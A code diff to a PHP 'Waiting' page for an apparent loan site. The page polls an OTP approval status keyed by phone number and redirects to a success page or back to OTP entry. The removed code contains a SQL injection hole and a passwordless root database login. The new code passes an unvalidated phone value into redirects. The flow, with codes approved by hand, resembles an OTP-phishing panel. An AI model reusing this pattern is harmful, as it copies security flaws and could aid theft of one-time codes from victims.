@@ -1,22 +1,25 @@
 <?php
-$conn = new mysqli("localhost","root","","loan-db");
+$phone = $_GET['phone'] ?? '';
 
-$id = $_GET['id'];
-
-$result = $conn->query("SELECT * FROM user_details WHERE id=$id");
-$row = $result->fetch_assoc();
-
-$status = $row['status'];
-
-// ✅ APPROVED → SUCCESS
-if ($status == "approve_done") {
-    header("Location: success.php?id=".$id);
+if(!$phone){
+    echo "Invalid access";
     exit();
 }
 
-// ❌ REJECTED → BACK TO OTP
-if ($status == "rejected_final") {
-    header("Location: otp.php?id=".$id."&phone=".$row['phone']."&error=1");
+// File where statuses are stored
+$file = __DIR__ . "/status.json";
+$statuses = file_exists($file) ? json_decode(file_get_contents($file), true) : [];
+
+// Check status
+$status = $statuses[$phone]['otp'] ?? '';
+
+if($status === 'approve'){
+    header("Location: success.php?phone=$phone");
+    exit();
+}
+
+if($status === 'reject'){
+    header("Location: otp.php?phone=$phone&error=1");
     exit();
 }
 ?>
@@ -24,25 +27,19 @@ if ($status == "rejected_final") {
 <!DOCTYPE html>
 <html>
 <head>
-    <meta http-equiv="refresh" content="5">
+    <meta http-equiv="refresh" content="2">
     <title>Waiting</title>
-
     <link rel="stylesheet" href="style.css">
 </head>
 
 <body>
-
 <div class="waiting-container">
-
-    <h2>Verifying your code</h2>
-
+    <h2>Verifying your code...</h2>
     <div class="loader">
         <span></span>
         <span></span>
         <span></span>
     </div>
-
 </div>
-
 </body>
 </html>
